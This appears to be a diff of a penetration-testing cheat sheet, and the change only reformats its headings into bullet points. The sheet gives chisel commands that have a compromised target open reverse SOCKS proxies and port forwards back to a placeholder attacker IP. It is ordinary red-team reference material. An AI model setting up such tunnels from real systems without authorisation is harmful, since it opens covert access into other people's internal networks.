@@ -4,15 +4,15 @@
 
 ### Reverse SOCKS proxy
 
-#### Attacker: ./chisel server -p LISTENING_PORT --reverse &
+ - Attacker: ./chisel server -p LISTENING_PORT --reverse &
 
-#### Target: ./chisel client ATTACK_IP:LISTEN_PORT R:SOCKS &
+ - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:SOCKS &
 
 ### Forward SOCKS proxy
 
-#### Target: ./chisel server -p LISTEN_PORT --socks5
+ - Target: ./chisel server -p LISTEN_PORT --socks5
 
-#### Attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+ - Attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
 
 ## TIP:
 
@@ -22,15 +22,15 @@
 
 ### Local Port Forward
 
-#### Target: ./chisel server -p LISTEN_PORT
+ - Target: ./chisel server -p LISTEN_PORT
 
-#### Attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+ - Attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
 
 ### Remote Port Forward
 
-#### Atttacker: ./chisel server -p LISTEN_PORT --reverse &
+ - Attacker: ./chisel server -p LISTEN_PORT --reverse &
 
-#### Target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+ - Target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
 
 ## TIP:
 
